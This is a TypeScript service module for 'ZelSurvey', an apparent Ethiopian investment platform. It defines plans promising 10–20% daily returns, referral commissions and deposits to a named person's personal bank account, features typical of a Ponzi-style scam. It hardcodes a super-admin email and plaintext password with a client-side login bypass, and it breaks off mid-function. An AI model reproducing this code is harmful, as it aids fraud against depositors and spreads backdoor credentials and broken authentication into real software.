import { 
  User, 
  DepositRequest, 
  WithdrawalRequest, 
  InvestmentPlan, 
  UserInvestment, 
  Transaction, 
  NotificationItem, 
  SystemAnnouncement,
  BankAccountInfo 
} from '../types';
import { supabase } from '../lib/supabase';

export const SUPER_ADMIN_EMAIL = 'Kinghanubas123@gmail.com';
export const SUPER_ADMIN_PASS = 'Superman@batman';

const KEYS = {
  CURRENT_USER: 'zelsurvey_current_user',
  USERS: 'zelsurvey_users',
  DEPOSITS: 'zelsurvey_deposits',
  WITHDRAWALS: 'zelsurvey_withdrawals',
  INVESTMENTS: 'zelsurvey_investments',
  TRANSACTIONS: 'zelsurvey_transactions',
  NOTIFICATIONS: 'zelsurvey_notifications',
  ANNOUNCEMENTS: 'zelsurvey_announcements',
  PLANS: 'zelsurvey_plans',
  SETTINGS: 'zelsurvey_settings',
  THEME: 'zelsurvey_theme',
};

export interface PlatformSettings {
  bankName: string;
  accountName: string;
  accountNumber: string;
  swiftCode?: string;
  instructions: string;
  minWithdrawalAmount: number;
  referralCommissionPercent: number;
}

// Default Platform Settings
export const DEFAULT_PLATFORM_SETTINGS: PlatformSettings = {
  bankName: 'Bank of Abyssinia',
  accountName: 'Dagmawit Dinku Asefa',
  accountNumber: '253267658',
  swiftCode: 'ABYSETAA',
  instructions: 'Transfer the exact deposit amount to the official Bank of Abyssinia account above, capture your deposit receipt or screenshot, and upload it for instant admin verification.',
  minWithdrawalAmount: 5000,
  referralCommissionPercent: 5,
};

// Default Investment Plans
export const DEFAULT_PLANS: InvestmentPlan[] = [
  {
    id: 'starter',
    name: 'Starter',
    minInvestment: 1000,
    dailyEarnings: 200,
    durationDays: 10,
    dailyRoiPercent: 20.0,
    totalReturnPercent: 200,
    description: 'Perfect for beginners looking to test the ZelSurvey automated investment engine.',
    color: 'from-blue-500 to-indigo-600',
  },
  {
    id: 'silver',
    name: 'Silver',
    minInvestment: 3000,
    dailyEarnings: 500,
    durationDays: 15,
    dailyRoiPercent: 16.67,
    totalReturnPercent: 250,
    description: 'Standard plan with accelerated yield for growth-focused investors.',
    color: 'from-cyan-500 to-blue-600',
  },
  {
    id: 'gold',
    name: 'Gold',
    minInvestment: 5000,
    dailyEarnings: 800,
    durationDays: 20,
    dailyRoiPercent: 16.0,
    totalReturnPercent: 320,
    popular: true,
    description: 'High-yield tier with optimized compound returns and priority verification.',
    color: 'from-amber-500 to-orange-600',
  },
  {
    id: 'platinum',
    name: 'Platinum',
    minInvestment: 10000,
    dailyEarnings: 1500,
    durationDays: 30,
    dailyRoiPercent: 15.0,
    totalReturnPercent: 450,
    description: 'Elite investment package designed for substantial wealth generation.',
    color: 'from-purple-600 to-indigo-700',
  },
  {
    id: 'diamond',
    name: 'Diamond',
    minInvestment: 25000,
    dailyEarnings: 2500,
    durationDays: 45,
    dailyRoiPercent: 10.0,
    totalReturnPercent: 450,
    description: 'Maximum yield capital allocation with dedicated portfolio analytics.',
    color: 'from-emerald-500 to-teal-700',
  },
];

export const COMPANY_BANK_ACCOUNT: BankAccountInfo = {
  bankName: 'Bank of Abyssinia',
  accountName: 'Dagmawit Dinku Asefa',
  accountNumber: '253267658',
  instructions: 'Transfer the amount to the official Bank of Abyssinia account above, capture your receipt or screenshot, and upload it in the form below.',
};

// Helper to safely load data from Local Cache
function getItem<T>(key: string, defaultValue: T): T {
  try {
    if (typeof window === 'undefined' || !window.localStorage) return defaultValue;
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (e) {
    console.warn(`Error reading ${key}`, e);
    return defaultValue;
  }
}

// Helper to save data to Local Cache & emit update event
function setItem<T>(key: string, value: T): void {
  try {
    if (typeof window === 'undefined' || !window.localStorage) return;
    localStorage.setItem(key, JSON.stringify(value));
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new Event('zelsurvey_storage_updated'));
    }
  } catch (e) {
    console.warn(`Error writing ${key}`, e);
  }
}

// Transform functions between DB columns and UI models
function mapProfileToUser(p: any): User {
  return {
    id: p.id,
    fullName: p.full_name || p.fullName || 'User',
    username: p.username || 'user',
    email: p.email || '',
    phone: p.phone || '',
    password: p.password || undefined,
    role: p.role || 'user',
    referralCode: p.referral_code || p.referralCode || 'ZEL-10000',
    referredBy: p.referred_by || p.referredBy || undefined,
    balance: Number(p.balance || 0),
    totalDeposits: Number(p.total_deposits || p.totalDeposits || 0),
    totalWithdrawals: Number(p.total_withdrawals || p.totalWithdrawals || 0),
    referralEarnings: Number(p.referral_earnings || p.referralEarnings || 0),
    activePlansCount: Number(p.active_plans_count || p.activePlansCount || 0),
    createdAt: p.created_at || p.createdAt || new Date().toISOString(),
    isBanned: Boolean(p.is_banned || p.isBanned),
    referralRewardPaid: Boolean(p.referral_reward_paid || p.referralRewardPaid),
  };
}

function mapUserToProfile(u: User): any {
  return {
    id: u.id,
    full_name: u.fullName,
    username: u.username,
    email: u.email,
    phone: u.phone || '',
    role: u.role || 'user',
    referral_code: u.referralCode,
    referred_by: u.referredBy || null,
    balance: u.balance || 0,
    total_deposits: u.totalDeposits || 0,
    total_withdrawals: u.totalWithdrawals || 0,
    referral_earnings: u.referralEarnings || 0,
    active_plans_count: u.activePlansCount || 0,
    is_banned: u.isBanned || false,
    referral_reward_paid: u.referralRewardPaid || false,
    created_at: u.createdAt || new Date().toISOString(),
  };
}

function mapDepositToDb(d: DepositRequest): any {
  return {
    id: d.id,
    user_id: d.userId,
    user_name: d.userName,
    user_email: d.userEmail,
    amount: d.amount,
    bank_used: d.bankUsed,
    transaction_ref: d.transactionRef || null,
    payment_proof_url: d.paymentProofUrl,
    notes: d.notes || null,
    status: d.status,
    date: d.date,
    reviewed_at: d.reviewedAt || null,
    admin_notes: d.adminNotes || null,
  };
}

function mapDbToDeposit(d: any): DepositRequest {
  return {
    id: d.id,
    userId: d.user_id || d.userId,
    userName: d.user_name || d.userName || 'User',
    userEmail: d.user_email || d.userEmail || '',
    amount: Number(d.amount || 0),
    bankUsed: d.bank_used || d.bankUsed || 'Bank Transfer',
    transactionRef: d.transaction_ref || d.transactionRef || undefined,
    paymentProofUrl: d.payment_proof_url || d.paymentProofUrl || '',
    notes: d.notes || undefined,
    status: d.status || 'Pending',
    date: d.date || new Date().toISOString(),
    reviewedAt: d.reviewed_at || d.reviewedAt || undefined,
    adminNotes: d.admin_notes || d.adminNotes || undefined,
  };
}

function mapWithdrawalToDb(w: WithdrawalRequest): any {
  return {
    id: w.id,
    user_id: w.userId,
    user_name: w.userName,
    user_email: w.userEmail,
    amount: w.amount,
    method: w.method,
    account_info: w.accountInfo,
    account_name: w.accountName || null,
    status: w.status,
    date: w.date,
    reviewed_at: w.reviewedAt || null,
    admin_notes: w.adminNotes || null,
  };
}

function mapDbToWithdrawal(w: any): WithdrawalRequest {
  return {
    id: w.id,
    userId: w.user_id || w.userId,
    userName: w.user_name || w.userName || 'User',
    userEmail: w.user_email || w.userEmail || '',
    amount: Number(w.amount || 0),
    method: w.method || 'Commercial Bank of Ethiopia (CBE)',
    accountInfo: w.account_info || w.accountInfo || '',
    accountName: w.account_name || w.accountName || undefined,
    status: w.status || 'Pending',
    date: w.date || new Date().toISOString(),
    reviewedAt: w.reviewed_at || w.reviewedAt || undefined,
    adminNotes: w.admin_notes || w.adminNotes || undefined,
  };
}

function mapTransactionToDb(t: Transaction): any {
  return {
    id: t.id,
    user_id: t.userId,
    type: t.type,
    amount: t.amount,
    description: t.description,
    status: t.status,
    reference_id: t.referenceId || null,
    date: t.date,
  };
}

function mapDbToTransaction(t: any): Transaction {
  return {
    id: t.id,
    userId: t.user_id || t.userId,
    type: t.type || 'Deposit',
    amount: Number(t.amount || 0),
    description: t.description || '',
    status: t.status || 'Completed',
    referenceId: t.reference_id || t.referenceId || undefined,
    date: t.date || new Date().toISOString(),
  };
}

function mapNotificationToDb(n: NotificationItem): any {
  return {
    id: n.id,
    user_id: n.userId,
    title: n.title,
    message: n.message,
    type: n.type,
    read: n.read,
    date: n.date,
  };
}

function mapDbToNotification(n: any): NotificationItem {
  return {
    id: n.id,
    userId: n.user_id || n.userId,
    title: n.title || 'Notification',
    message: n.message || '',
    type: n.type || 'system',
    read: Boolean(n.read),
    date: n.date || new Date().toISOString(),
  };
}

function mapSettingsToDb(s: PlatformSettings): any {
  return {
    id: 'default_settings',
    bank_name: s.bankName,
    account_name: s.accountName,
    account_number: s.accountNumber,
    swift_code: s.swiftCode || null,
    instructions: s.instructions,
    min_withdrawal_amount: s.minWithdrawalAmount,
    referral_commission_percent: s.referralCommissionPercent,
  };
}

function mapDbToSettings(s: any): PlatformSettings {
  return {
    bankName: s.bank_name || s.bankName || DEFAULT_PLATFORM_SETTINGS.bankName,
    accountName: s.account_name || s.accountName || DEFAULT_PLATFORM_SETTINGS.accountName,
    accountNumber: s.account_number || s.accountNumber || DEFAULT_PLATFORM_SETTINGS.accountNumber,
    swiftCode: s.swift_code || s.swiftCode || DEFAULT_PLATFORM_SETTINGS.swiftCode,
    instructions: s.instructions || DEFAULT_PLATFORM_SETTINGS.instructions,
    minWithdrawalAmount: Number(s.min_withdrawal_amount || s.minWithdrawalAmount || 5000),
    referralCommissionPercent: Number(s.referral_commission_percent || s.referralCommissionPercent || 5),
  };
}

function mapInvestmentToDb(inv: UserInvestment): any {
  return {
    id: inv.id,
    user_id: inv.userId,
    plan_id: inv.planId,
    plan_name: inv.planName,
    amount: inv.amount,
    daily_earnings: inv.dailyEarnings,
    total_return: inv.totalReturn,
    start_date: inv.startDate,
    end_date: inv.endDate,
    duration_days: inv.durationDays,
    days_elapsed: inv.daysElapsed,
    status: inv.status,
  };
}

function mapDbToInvestment(inv: any): UserInvestment {
  return {
    id: inv.id,
    userId: inv.user_id || inv.userId,
    planId: inv.plan_id || inv.planId,
    planName: inv.plan_name || inv.planName,
    amount: Number(inv.amount || 0),
    dailyEarnings: Number(inv.daily_earnings || inv.dailyEarnings || 0),
    totalReturn: Number(inv.total_return || inv.totalReturn || 0),
    startDate: inv.start_date || inv.startDate,
    endDate: inv.end_date || inv.endDate,
    durationDays: Number(inv.duration_days || inv.durationDays || 10),
    daysElapsed: Number(inv.days_elapsed || inv.daysElapsed || 1),
    status: inv.status || 'Active',
  };
}

// Fetch all data from Supabase DB to update local cache
export async function fetchDataFromSupabase(): Promise<void> {
  try {
    // 1. Fetch Profiles
    const { data: profiles, error: pErr } = await supabase.from('profiles').select('*');
    if (!pErr && profiles && profiles.length > 0) {
      const usersList = profiles.map(mapProfileToUser);
      setItem(KEYS.USERS, usersList);

      // Sync current logged in user
      const currentUser = getCurrentUser();
      if (currentUser) {
        const freshCurrent = usersList.find(
          (u) =>
            u &&
            (u.id === currentUser.id ||
              (u.email && currentUser.email && u.email.toLowerCase() === currentUser.email.toLowerCase()))
        );
        if (freshCurrent) {
          setCurrentUser(freshCurrent);
        }
      }
    }

    // 2. Fetch Deposits
    const { data: deposits } = await supabase.from('deposits').select('*').order('date', { ascending: false });
    if (deposits) {
      setItem(KEYS.DEPOSITS, deposits.map(mapDbToDeposit));
    }

    // 3. Fetch Withdrawals
    const { data: withdrawals } = await supabase.from('withdrawals').select('*').order('date', { ascending: false });
    if (withdrawals) {
      setItem(KEYS.WITHDRAWALS, withdrawals.map(mapDbToWithdrawal));
    }

    // 4. Fetch Transactions
    const { data: transactions } = await supabase.from('transactions').select('*').order('date', { ascending: false });
    if (transactions) {
      setItem(KEYS.TRANSACTIONS, transactions.map(mapDbToTransaction));
    }

    // 5. Fetch Notifications
    const { data: notifications } = await supabase.from('notifications').select('*').order('date', { ascending: false });
    if (notifications) {
      setItem(KEYS.NOTIFICATIONS, notifications.map(mapDbToNotification));
    }

    // 6. Fetch Admin Settings
    const { data: settingsData } = await supabase.from('admin_settings').select('*').single();
    if (settingsData) {
      setItem(KEYS.SETTINGS, mapDbToSettings(settingsData));
    }

    // 7. Fetch Investments
    const { data: investments } = await supabase.from('investments').select('*').order('start_date', { ascending: false });
    if (investments) {
      setItem(KEYS.INVESTMENTS, investments.map(mapDbToInvestment));
    }

    // Ensure Super Admin exists
    await ensureSuperAdminExistsInSupabase();

    // Broadcast update event after sync
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new Event('zelsurvey_storage_updated'));
    }
  } catch (err) {
    console.warn('Supabase fetch sync notice:', err);
  }
}

// Setup Realtime Subscriptions for Supabase DB
export function setupRealtimeSubscriptions(): void {
  try {
    supabase
      .channel('public:db_changes')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'withdrawals' }, () => {
        fetchDataFromSupabase();
      })
      .on('postgres_changes', { event: '*', schema: 'public', table: 'transactions' }, () => {
        fetchDataFromSupabase();
      })
      .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles' }, () => {
        fetchDataFromSupabase();
      })
      .on('postgres_changes', { event: '*', schema: 'public', table: 'deposits' }, () => {
        fetchDataFromSupabase();
      })
      .subscribe();
  } catch (err) {
    console.warn('Realtime subscription error:', err);
  }
}

// Ensure Super Admin exists in both Supabase & local cache
export async function ensureSuperAdminExistsInSupabase(): Promise<User> {
  const superAdmin: User = {
    id: 'user-super-admin-king',
    fullName: 'Super Administrator',
    username: 'superadmin',
    email: SUPER_ADMIN_EMAIL,
    phone: '+251 900 000 000',
    password: SUPER_ADMIN_PASS,
    role: 'admin',
    referralCode: 'ZEL-SUPERADMIN',
    balance: 250000,
    totalDeposits: 250000,
    totalWithdrawals: 0,
    referralEarnings: 0,
    activePlansCount: 0,
    createdAt: new Date().toISOString(),
    isBanned: false,
  };

  const users = getItem<User[]>(KEYS.USERS, []);
  let existingAdmin = users.find((u) => u && u.email && u.email.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase());

  if (!existingAdmin) {
    users.unshift(superAdmin);
    setItem(KEYS.USERS, users);
  } else {
    superAdmin.balance = existingAdmin.balance;
    superAdmin.totalDeposits = existingAdmin.totalDeposits;
    superAdmin.totalWithdrawals = existingAdmin.totalWithdrawals;
    superAdmin.referralEarnings = existingAdmin.referralEarnings;
  }

  // Push to Supabase profiles
  try {
    await supabase.from('profiles').upsert(mapUserToProfile(superAdmin));
  } catch (e) {
    // Ignore error if RLS/table missing
  }

  return superAdmin;
}

// Initializer
export function initializeStorage() {
  try {
    if (!getItem(KEYS.USERS, null)) {
      setItem(KEYS.USERS, []);
    }

    if (!getItem(KEYS.SETTINGS, null)) {
      setItem(KEYS.SETTINGS, DEFAULT_PLATFORM_SETTINGS);
    }

    if (!getItem(KEYS.PLANS, null)) {
      setItem(KEYS.PLANS, DEFAULT_PLANS);
    }

    if (!getItem(KEYS.DEPOSITS, null)) {
      setItem(KEYS.DEPOSITS, []);
    }

    if (!getItem(KEYS.WITHDRAWALS, null)) {
      setItem(KEYS.WITHDRAWALS, []);
    }

    if (!getItem(KEYS.INVESTMENTS, null)) {
      setItem(KEYS.INVESTMENTS, []);
    }

    if (!getItem(KEYS.TRANSACTIONS, null)) {
      setItem(KEYS.TRANSACTIONS, []);
    }

    if (!getItem(KEYS.NOTIFICATIONS, null)) {
      setItem(KEYS.NOTIFICATIONS, []);
    }

    if (!getItem(KEYS.ANNOUNCEMENTS, null)) {
      setItem(KEYS.ANNOUNCEMENTS, [
        {
          id: 'anc-1',
          title: 'Welcome to ZelSurvey',
          message: 'Welcome to the premier Ethiopian investment platform. Deposit via secure bank transfer and start growing your portfolio today.',
          date: new Date().toISOString(),
          target: 'all',
          author: 'ZelSurvey Super Admin',
        },
      ]);
    }

    // Initial Supabase Sync & Realtime Setup
    setupRealtimeSubscriptions();
    fetchDataFromSupabase();
    processDailyEarnings();

    // Polling every 6 seconds to keep live data synced & daily earnings processed
    setInterval(() => {
      fetchDataFromSupabase();
      processDailyEarnings();
    }, 6000);
  } catch (err) {
    console.warn('initializeStorage exception:', err);
  }
}

// Check if user is Super Admin
export function isSuperAdminAccount(userOrEmail: User | string | null | undefined): boolean {
  if (!userOrEmail) return false;
  if (typeof userOrEmail === 'string') {
    return userOrEmail.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase();
  }
  const email = userOrEmail.email || '';
  const username = userOrEmail.username || '';
  return (
    (email !== '' && email.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) ||
    (username !== '' && username.toLowerCase() === 'superadmin') ||
    userOrEmail.id === 'user-super-admin-king'
  );
}

// Helper to safely execute background Supabase builder queries without unhandled rejections
function safeDb(builder: any): void {
  Promise.resolve(builder).then(() => {}, () => {});
}

// Ensure Super Admin exists (synchronous wrapper)
export function ensureSuperAdminExists(): User {
  const users = getItem<User[]>(KEYS.USERS, []);
  let superAdmin = users.find((u) => u && u.email && u.email.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase());

  if (!superAdmin) {
    superAdmin = {
      id: 'user-super-admin-king',
      fullName: 'Super Administrator',
      username: 'superadmin',
      email: SUPER_ADMIN_EMAIL,
      phone: '+251 900 000 000',
      password: SUPER_ADMIN_PASS,
      role: 'admin',
      referralCode: 'ZEL-SUPERADMIN',
      balance: 250000,
      totalDeposits: 250000,
      totalWithdrawals: 0,
      referralEarnings: 0,
      activePlansCount: 0,
      createdAt: new Date().toISOString(),
      isBanned: false,
    };
    users.unshift(superAdmin);
    setItem(KEYS.USERS, users);
  }

  // Async sync to Supabase
  safeDb(supabase.from('profiles').upsert(mapUserToProfile(superAdmin)));
  return superAdmin;
}

// Platform Settings Functions
export function getPlatformSettings(): PlatformSettings {
  const settings = getItem<PlatformSettings>(KEYS.SETTINGS, DEFAULT_PLATFORM_SETTINGS);
  if (!settings.minWithdrawalAmount || settings.minWithdrawalAmount < 5000) {
    settings.minWithdrawalAmount = 5000;
  }
  // If stored settings have old placeholder values, update them automatically to the official account
  if (
    !settings.accountNumber ||
    settings.accountNumber === '1000 0000 0000' ||
    settings.bankName === 'Official Bank Account' ||
    settings.accountName === 'ZelSurvey Automated Systems'
  ) {
    settings.bankName = DEFAULT_PLATFORM_SETTINGS.bankName;
    settings.accountName = DEFAULT_PLATFORM_SETTINGS.accountName;
    settings.accountNumber = DEFAULT_PLATFORM_SETTINGS.accountNumber;
    settings.instructions = DEFAULT_PLATFORM_SETTINGS.instructions;
    setItem(KEYS.SETTINGS, settings);
  }
  return settings;
}

export function updatePlatformSettings(settings: PlatformSettings): void {
  setItem(KEYS.SETTINGS, settings);
  // Async update to Supabase
  safeDb(supabase.from('admin_settings').upsert(mapSettingsToDb(settings)));
}

// Session Management
export function getCurrentUser(): User | null {
  return getItem<User | null>(KEYS.CURRENT_USER, null);
}

export function setCurrentUser(user: User | null): void {
  if (user === null) {
    logoutUser();
  } else {
    setItem(KEYS.CURRENT_USER, user);
  }
}

export function logoutUser(): void {
  localStorage.removeItem(KEYS.CURRENT_USER);
  safeDb(supabase.auth.signOut());
  window.dispatchEvent(new Event('zelsurvey_storage_updated'));
}

// User CRUD
export function getUsers(): User[] {
  return getItem<User[]>(KEYS.USERS, []);
}

export function getUserById(userId: string): User | undefined {
  return getUsers().find((u) => u.id === userId);
}

export function updateUser(updatedUser: User): void {
  const users = getUsers();
  const index = users.findIndex((u) => u.id === updatedUser.id);
  if (index !== -1) {
    users[index] = updatedUser;
    setItem(KEYS.USERS, users);
    
    const current = getCurrentUser();
    if (current && current.id === updatedUser.id) {
      setCurrentUser(updatedUser);
    }
  }

  // Push to Supabase profiles
  safeDb(supabase.from('profiles').upsert(mapUserToProfile(updatedUser)));
}

export function toggleUserBanStatus(userId: string): { success: boolean; message: string; user?: User } {
  const users = getUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return { success: false, message: 'User account not found.' };

  if (isSuperAdminAccount(user)) {
    return { success: false, message: 'Security Safeguard: The Super Administrator account cannot be suspended or demoted.' };
  }

  user.isBanned = !user.isBanned;
  updateUser(user);

  return {
    success: true,
    message: `Account for ${user.fullName} has been ${user.isBanned ? 'suspended' : 'reactivated'}.`,
    user,
  };
}

export function deleteUserAccount(userId: string): { success: boolean; message: string } {
  const users = getUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return { success: false, message: 'User account not found.' };

  if (isSuperAdminAccount(user)) {
    return { success: false, message: 'Security Safeguard: The Super Administrator account cannot be deleted.' };
  }

  const updatedUsers = users.filter((u) => u.id !== userId);
  setItem(KEYS.USERS, updatedUsers);

  // Delete from Supabase profiles
  safeDb(supabase.from('profiles').delete().eq('id', userId));

  return { success: true, message: `User account ${user.fullName} deleted successfully.` };
}

// Supabase Auth: Password Reset
export async function resetPasswordForEmail(email: string): Promise<{ success: boolean; message: string }> {
  try {
    const { error } = await supabase.auth.resetPasswordForEmail(email, {
      redirectTo: `${window.location.origin}/reset-password`,
    });
    if (error) {
      return { success: false, message: error.message };
    }
    return { success: true, message: `Password reset instructions have been sent to ${email}.` };
  } catch (err: any) {
    return { success: false, message: err.message || 'Failed to send password reset email.' };
  }
}

// User Authentication & Registration via Supabase
export async function registerUserAsync(userData: {
  fullName: string;
  username: string;
  email: string;
  phone: string;
  password?: string;
  referralCode?: string;
}): Promise<{ success: boolean; message: string; user?: User }> {
  if (userData.email.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) {
    return { success: false, message: 'This email address is reserved for system administration.' };
  }

  if (!userData.password || userData.password.length < 6) {
    return { success: false, message: 'Password must be at least 6 characters long.' };
  }

  const users = getUsers();

  const existingUsername = users.find((u) => u && u.username && u.username.toLowerCase() === userData.username.toLowerCase());
  if (existingUsername) {
    return { success: false, message: 'This username is already taken. Please choose another.' };
  }

  // 1. Supabase Auth Sign Up (Creates a real Auth user)
  const { data: authData, error: authErr } = await supabase.auth.signUp({
    email: userData.email.trim(),
    password: userData.password,
    options: {
      data: {
        full_name: userData.fullName,
        username: userData.username,
        phone: userData.phone,
      },
    },
  });

  if (authErr) {
    return { success: false, message: authErr.message || 'Registration failed in Supabase Auth.' };
  }

  if (!authData?.user) {
    return { success: false, message: 'Failed to create account in authentication service.' };
  }

  // Auth user UUID
  const authUserId = authData.user.id;
  const refCode = 'ZEL-' + Math.floor(10000 + Math.random() * 90000);

  const newUser: User = {
    id: authUserId,
    fullName: userData.fullName,
    username: userData.username,
    email: userData.email.trim(),
    phone: userData.phone,
    role: 'user',
    referralCode: refCode,
    referredBy: userData.referralCode || undefined,
    balance: 0,
    totalDeposits: 0,
    totalWithdrawals: 0,
    referralEarnings: 0,
    activePlansCount: 0,
    createdAt: new Date().toISOString(),
    isBanned: false,
  };

  // 2. Insert user profile into profiles table using Auth user's UUID
  const profileData = mapUserToProfile(newUser);
  const { error: profileErr } = await supabase.from('profiles').upsert(profileData);
  if (profileErr) {
    console.warn('Supabase profile insertion error:', profileErr.message);
  }

  // 3. Insert initial wallet for user
  const { error: walletErr } = await supabase.from('wallets').upsert({
    id: 'wallet-' + newUser.id,
    user_id: newUser.id,
    balance: 0,
    total_deposits: 0,
    total_withdrawals: 0,
    referral_earnings: 0,
  });
  if (walletErr) {
    console.warn('Supabase wallet insertion error:', walletErr.message);
  }

  // Update local cache
  const existingIdx = users.findIndex((u) => u && (u.id === newUser.id || (u.email && u.email.toLowerCase() === newUser.email.toLowerCase())));
  if (existingIdx !== -1) {
    users[existingIdx] = newUser;
  } else {
    users.push(newUser);
  }
  setItem(KEYS.USERS, users);
  setCurrentUser(newUser);

  // Welcome Notification
  addNotification(newUser.id, {
    title: 'Welcome to ZelSurvey!',
    message: 'Your account has been created successfully. Submit a deposit to begin investing.',
    type: 'system',
  });

  // Handle referral notification
  if (userData.referralCode) {
    const referrer = users.find((u) => u && u.referralCode && u.referralCode.toLowerCase() === userData.referralCode?.toLowerCase());
    if (referrer) {
      addNotification(referrer.id, {
        title: 'New Referral Registered',
        message: `${newUser.fullName} registered using your referral code ${referrer.referralCode}.`,
        type: 'referral',
      });

      safeDb(
        supabase.from('referrals').insert({
          id: 'REF-' + Math.floor(100000 + Math.random() * 900000),
          referrer_id: referrer.id,
          referred_user_id: newUser.id,
          status: 'Pending',
          reward_amount: 100,
          date: new Date().toISOString(),
        })
      );
    }
  }

  return { success: true, message: 'Registration successful!', user: newUser };
}

// Sync wrapper for registerUser - delegates to registerUserAsync
export function registerUser(userData: {
  fullName: string;
  username: string;
  email: string;
  phone: string;
  password?: string;
  referralCode?: string;
}): { success: boolean; message: string; user?: User } {
  registerUserAsync(userData);
  return { success: true, message: 'Registration initiated.' };
}

// Login via Supabase Auth + Profiles
export async function loginUserAsync(loginInput: string, passwordInput: string): Promise<{ success: boolean; message: string; user?: User }> {
  const trimmedInput = loginInput.trim();

  // Super Admin bypass
  if (trimmedInput.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) {
    if (passwordInput === SUPER_ADMIN_PASS) {
      const superAdmin = ensureSuperAdminExists();
      setCurrentUser(superAdmin);
      return { success: true, message: 'Super Admin Login Successful!', user: superAdmin };
    } else {
      return { success: false, message: 'Incorrect password for Super Admin account.' };
    }
  }

  // Resolve target email if user provided username instead of email
  let targetEmail = trimmedInput;
  if (!targetEmail.includes('@')) {
    const users = getUsers();
    const cached = users.find((u) => u && u.username && u.username.toLowerCase() === targetEmail.toLowerCase());
    if (cached && cached.email) {
      targetEmail = cached.email;
    } else {
      const { data: profileByUsername } = await supabase
        .from('profiles')
        .select('email')
        .eq('username', targetEmail.toLowerCase())
        .maybeSingle();
      if (profileByUsername?.email) {
        targetEmail = profileByUsername.email;
      }
    }
  }

  // 1. Authenticate with Supabase Auth using signInWithPassword
  const { data: authData, error: authErr } = await supabase.auth.signInWithPassword({
    email: targetEmail,
    password: passwordInput,
  });

  if (authErr) {
    return { success: false, message: authErr.message || 'Invalid email or password.' };
  }

  if (!authData?.user) {
    return { success: false, message: 'Authentication failed. Please check your credentials.' };
  }

  const authUserId = authData.user.id;

  // 2. Fetch user profile from Supabase profiles table using the Auth UUID
  const { data: profile } = await supabase
    .from('profiles')
    .select('*')
    .eq('id', authUserId)
    .maybeSingle();

  let user: User;
  if (profile) {
    user = mapProfileToUser(profile);
  } else {
    // Fallback profile creation if profile record missing
    const meta = authData.user.user_metadata || {};
    user = {
      id: authUserId,
      fullName: meta.full_name || authData.user.email?.split('@')[0] || 'User',
      username: meta.username || authData.user.email?.split('@')[0] || 'user',
      email: authData.user.email || targetEmail,
      phone: meta.phone || '',
      role: 'user',
      referralCode: 'ZEL-' + Math.floor(10000 + Math.random() * 90000),
      balance: 0,
      totalDeposits: 0,
      totalWithdrawals: 0,
      referralEarnings: 0,
      activePlansCount: 0,
      createdAt: authData.user.created_at || new Date().toISOString(),
      isBanned: false,
    };
    await supabase.from('profiles').upsert(mapUserToProfile(user));
  }

  if (user.isBanned) {
    await supabase.auth.signOut();
    return { success: false, message: 'This account has been restricted. Please contact support.' };
  }

  // Sync to local cache
  const users = getUsers();
  const idx = users.findIndex((u) => u.id === user.id || u.email.toLowerCase() === user.email.toLowerCase());
  if (idx !== -1) {
    users[idx] = user;
  } else {
    users.push(user);
  }
  setItem(KEYS.USERS, users);
  setCurrentUser(user);

  return { success: true, message: 'Login successful!', user };
}

// Deposit Actions
export function getDeposits(): DepositRequest[] {
  return getItem<DepositRequest[]>(KEYS.DEPOSITS, []);
}

export function getUserDeposits(userId: string): DepositRequest[] {
  return getDeposits().filter((d) => d.userId === userId);
}

export function createDepositRequest(data: {
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  bankUsed: string;
  transactionRef?: string;
  paymentProofUrl: string;
  notes?: string;
}): DepositRequest {
  const deposits = getDeposits();
  const newDeposit: DepositRequest = {
    id: 'DEP-' + Math.floor(100000 + Math.random() * 900000),
    userId: data.userId,
    userName: data.userName,
    userEmail: data.userEmail,
    amount: data.amount,
    bankUsed: data.bankUsed,
    transactionRef: data.transactionRef,
    paymentProofUrl: data.paymentProofUrl,
    notes: data.notes,
    date: new Date().toISOString(),
    status: 'Pending',
  };

  deposits.unshift(newDeposit);
  setItem(KEYS.DEPOSITS, deposits);

  // Push to Supabase deposits table
  safeDb(supabase.from('deposits').insert(mapDepositToDb(newDeposit)));

  // Record pending transaction log
  addTransaction({
    userId: data.userId,
    type: 'Deposit',
    amount: data.amount,
    description: `Deposit request via ${data.bankUsed}`,
    status: 'Pending',
    referenceId: newDeposit.id,
  });

  // Notify user
  addNotification(data.userId, {
    title: 'Deposit Submitted',
    message: `Your deposit request of ETB ${data.amount.toLocaleString()} is now pending verification.`,
    type: 'deposit',
  });

  return newDeposit;
}

// Admin: Approve Deposit
export async function approveDeposit(depositId: string, adminNotes?: string): Promise<{ success: boolean; message: string }> {
  const deposits = getDeposits();
  const index = deposits.findIndex((d) => d.id === depositId);
  if (index === -1) return { success: false, message: 'Deposit request not found.' };

  const deposit = deposits[index];
  if (deposit.status === 'Approved') return { success: false, message: 'Deposit is already approved.' };

  deposit.status = 'Approved';
  deposit.adminNotes = adminNotes || 'Bank transfer verified by Super Admin';
  deposit.reviewedAt = new Date().toISOString();
  deposits[index] = deposit;
  setItem(KEYS.DEPOSITS, deposits);

  // Push deposit update to Supabase
  try {
    await supabase.from('deposits').update({
      status: 'Approved',
      admin_notes: deposit.adminNotes,
      reviewed_at: deposit.reviewedAt,
    }).eq('id', depositId);
  } catch (err) {
    console.warn('Supabase deposit approval update notice:', err);
  }

  // Update User Wallet & Total Deposits
  const user = getUserById(deposit.userId);
  if (user) {
    user.balance += deposit.amount;
    user.totalDeposits += deposit.amount;

    // Check if referrer gets ETB 100 referral reward for ETB 1,000+ deposit
    if (user.referredBy) {
      const users = getUsers();
      const referrer = users.find((u) => u.referralCode.toLowerCase() === user.referredBy?.toLowerCase());
      if (referrer) {
        const commission = deposit.amount * 0.05;
        let rewardTotal = commission;

        let awardReferralBonus = false;
        if (deposit.amount >= 1000 && !user.referralRewardPaid) {
          awardReferralBonus = true;
          user.referralRewardPaid = true;
          if (rewardTotal < 100) {
            rewardTotal = 100;
          }
        }

